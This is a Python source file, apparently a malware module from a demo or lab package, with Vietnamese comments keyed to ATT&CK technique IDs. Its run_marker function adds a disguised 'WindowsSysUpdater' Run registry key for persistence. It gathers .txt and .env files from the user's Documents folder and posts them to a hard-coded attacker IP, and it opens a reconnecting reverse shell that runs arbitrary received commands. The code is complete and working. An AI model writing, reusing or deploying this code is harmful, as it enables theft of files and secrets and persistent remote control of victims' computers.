import os
import socket
import subprocess
import urllib.request
import urllib.parse
import time
import threading
import sys

ATTACKER_IP = '192.168.157.134'
EXFIL_PORT = 8080
SHELL_PORT = 4444

def persist_registry():
    """T1547.001 - Thêm Registry Key để tồn tại sau khi reboot"""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        # Gọi đích danh package và hàm run_marker thay vì pass
        payload_cmd = f'"{sys.executable}" -c "from safe_demo_pkg.marker import run_marker; run_marker()"'
        
        winreg.SetValueEx(key, "WindowsSysUpdater", 0, winreg.REG_SZ, payload_cmd)
        winreg.CloseKey(key)
    except Exception:
        pass
    
def true_exfiltrate():
    """T1041 - Gửi data thực sự qua mạng về C2"""
    user_path = os.path.expanduser('~')
    target_dir = os.path.join(user_path, 'Documents')
    loot = ""
    try:
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt", ".env", "config.txt")):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            loot += f"\n--- {file} ---\n{f.read()}"
                    except: pass
        if loot:
            data = urllib.parse.urlencode({'data': loot}).encode('utf-8')
            req = urllib.request.Request(f'http://{ATTACKER_IP}:{EXFIL_PORT}/exfil', data=data)
            urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        pass # Đã sửa lỗi double except lồng nhau

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, SHELL_PORT))
            s.send(b"\n[+] S04 Advanced Shell Connected!\n")
            while True:
                s.send(b"Shell> ")
                data = s.recv(1024).decode("utf-8").strip()
                if data.lower() in ["exit", "quit"]: return
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"Command executed.\n")
        except:
            time.sleep(10)

def run_marker():
    persist_registry()
    threading.Thread(target=true_exfiltrate, daemon=False).start()
    threading.Thread(target=reverse_shell, daemon=False).start()
